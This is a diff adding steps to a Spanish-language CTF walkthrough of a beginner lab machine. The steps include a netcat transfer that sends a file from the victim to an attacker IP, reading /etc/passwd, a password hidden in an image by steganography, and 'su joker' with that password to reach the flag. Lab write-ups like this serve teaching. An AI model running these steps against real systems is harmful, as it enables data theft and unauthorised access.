@@ -196,24 +196,78 @@ Vamos a acceder al servidor por el servicio SSH y... ¡¿Estamos dentro!!
 
 ![acceso](/assets/img/2023-02-17/acceso.png)
 
+Vamos a hacer un reconocimiento manual, ya que se trata de una máquina virtual muy básica y no hacen falta herramientas que busquen debilidad/fallos de permisos, ficheros críticos..., como podría ser la herramienta linpeas (https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).
+
+Encontramos una imagen, vamos a pasarla a nuestra máquina atacante con netcat para su posterior análisis. Debemos de lanzar primero la orden en Kali para quedarnos en escucha para, posteriormente, lanzar netcat en la máquina víctima para transferirnos la imagen.
+
+Terminal máquina atacante.
+
+```bash
+nc -lvnp 4444 > iknowyou.jpg
+```
+
+Terminal máquina víctima.
+
+```bash
+nc -N 10.0.2.5 4444 < iknowyou.jpg
+```
+
 ![ncImagen](/assets/img/2023-02-17/pasarimagendeservidor.png)
 
+Como no se ve nada significante en los metadatos y no contiene nada oculto dentro de ésta, vamos a intentar ver si tiene información visualmente escondida, analizándola a nivel de capas de bits. Para ello, vamos a utilizar la herramienta stegsolve (https://github.com/zardus/ctf-tools/blob/master/stegsolve/install).
+
+Si no añadimos la ubicación de la herramienta al path, lo lanzamos desde el directorio donde se encuentra.
+
+```bash
+./stegsolve.jar
+```
+
 ![gitclone](/assets/img/2023-02-17/gitclonestegsolve.png)
+
+Seleccionamos la imagen y la analizamos. Encontramos en la parte izquierda un texto oculto (ThatMadeMeL4ugh!)
 
 ![stegsolve](/assets/img/2023-02-17/stegsolve.png)
 
 ![stegsolve2](/assets/img/2023-02-17/stegsolve2.png)
 
+Haciendo un pequeño inciso, os recomiendo esta herramienta online, tratándose de un todo en uno para análisis de esteganografía. También nos aplica la técnica que acabamos de realizar con stegsolve, además de metadatos y otra información bastante útil. Os recomiendo que os paséis por ella e intentéis testearla!.
+
+Aperisolve (https://www.aperisolve.com/)
+
 ![aperisolve](/assets/img/2023-02-17/aperisolve.png)
 
 ![aperisolve2](/assets/img/2023-02-17/aperisolve2.png)
 
+Ahora, teniendo esa credencial, necesitamos saber a qué usuario del sistema pertenece. Vamos a analizar el fichero /etc/passwd, ya que tenemos permiso de lectura sobre el mismo.
+
+```bash
+cat /etc/passwd
+```
+
 ![passwd](/assets/img/2023-02-17/passwd.png)
+
+Vemos que hay un usuario del sistema (ID +1000) llamado joker, vamos a intentar acceder a su home, pero no tenemos permisos.
 
 ![homejoker](/assets/img/2023-02-17/homejoker.PNG)
 
+Teniendo el nombre de usuario joker y la credencial ThatMadeMeL4ugh!, vamos a intentar loguearnos.
+
+```bash
+su joker
+ThatMadeMeL4ugh!
+```
+
+Ahora, ya podemos visualizar la flag en el directorio home del usuario joker. ¡¡¡Hemos encontrado al criminal!!!
+
 ![flag](/assets/img/2023-02-17/flag.png)
 
-![history](/assets/img/2023-02-17/alternativasHistory.png)
 
-holaholaholaholaaaa
+¡Gracias por dedicar un tiempo a la resolución de esta máquina!
+Espero que hayáis disfrutado y aprendido un montón y que este taller haya sido el empujón/motivación que necesitabáis para introduciros en el mundo de los CTFs y/o resoluciones de laboratorios y retos.
+
+Como siempre, cualquier duda y petición al respecto, podéis contactar conmigo a través del e-mail waidroc@protonmail.com
+
+Muchas gracías por leer 
+Waidroc
+
+
